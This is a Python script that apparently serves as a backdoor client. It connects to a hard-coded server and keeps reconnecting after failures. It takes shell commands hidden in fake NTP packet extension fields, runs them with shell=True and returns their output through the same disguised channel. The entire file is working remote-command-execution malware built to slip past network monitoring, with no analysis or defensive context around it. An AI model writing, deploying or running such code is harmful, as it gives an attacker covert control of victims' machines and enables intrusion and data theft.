import socket
import struct
import subprocess
import time
import random

server_address = "192.168.0.10"
server_port = 123
client = None

def connect_to_server():
    global client
    while True: 
        try: 
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((server_address, server_port))
            print(f"Connected to server at {server_address}:{server_port}")
            return 
        except Exception as e:
            print(f"Connection failed: {e}")
            wait_time = random.randint(5, 15)
            print(f"Connection refused, retrying in {wait_time} seconds...")
            time.sleep(wait_time)


def make_ntp_packet(message):
    header = struct.pack("!B B B b 11I", 0b00100011, 1, 0, 0, *(0 for _ in range(11)))
    ext_type = 0xC0DE
    data = message.encode()
    length = 4 + len(data)
    pad_length = (4 - (length % 4)) % 4
    total_length = length + pad_length
    ext_header = struct.pack("!HH", ext_type, total_length)
    ext_data = data + (b'\x00' * pad_length)
    ext = ext_header + ext_data
    packet = header + ext
    return packet

def parse_ntp_packet(buf: bytes, offset: int = 48):
    results = []
    while offset + 4 <= len(buf):
        ext_hdr = buf[offset:offset+4]
        ext_type, ext_len = struct.unpack("!HH", ext_hdr)
        if ext_len < 4:
            # malformed
            break
        if offset + ext_len > len(buf):
            # truncated
            break
        data = buf[offset+4: offset+ext_len]
        results.append((ext_type, data))
        # advance - ext_len is already padded to 4 bytes
        offset += ext_len
    return results

def send_response(response):
    print("Sending response back to server...")
    ntp_packet = make_ntp_packet(response)
    client.send(ntp_packet)

def handle_data(data):
    try: 
        exts = parse_ntp_packet(data)
        if exts:
                command = exts[0][1].decode().strip("\x00")
                print(f"Executing command {command}...")
                output = subprocess.run(command, capture_output=True, shell=True)
                print(f"Command executed with return code {output.returncode}")
                response = output.stdout.decode() if output.stdout else ""
                print(f"Command output:\n{response}")
                send_response(response)
    except Exception as e:
        print(f"Error parsing NTP packet: {e}")

def receive_messages():
    global client
    print("Now listening...")
    client.settimeout(60)
    while True: 
        try: 
            data = client.recv(4096)
            handle_data(data)
        except: 
            print("Error receiving data from server.")
            try: 
                client.close()
            except: 
                pass
            connect_to_server()
            print("Reconnected to server.")

connect_to_server()
receive_messages()